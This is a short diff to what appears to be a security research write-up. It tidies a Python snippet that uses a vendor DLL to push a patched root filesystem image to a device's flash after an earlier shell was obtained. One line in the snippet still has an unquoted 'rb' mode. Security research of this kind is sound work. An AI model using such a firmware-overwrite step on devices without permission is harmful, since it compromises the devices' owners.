@@ -206,18 +206,15 @@ Connecting with the shell we obtained previously, we were able to confirm the ex
 def send_file(path, content):
     pvlink = CDLL("./PVLink.dll")
     sendfile = pvlink.PVSendFile
-    point = 
-    a = 0
-    init = 
     r = sendfile(path, len(content), content)
     if r != 0:
-        print(Error)
+        print("Error")
     else:
-        print(Wrote /flash/storage/rootfs_patch.sqsh)
+        print("Wrote /flash/storage/rootfs_patch.sqsh")
 
 if __name__ == "__main__":
     f = open("rootfs_patch.sqsh", rb)
-    print(running...)
+    print("running...")
     send_file("updates:rootfs_patch.sqsh", f.read())
 ```
 
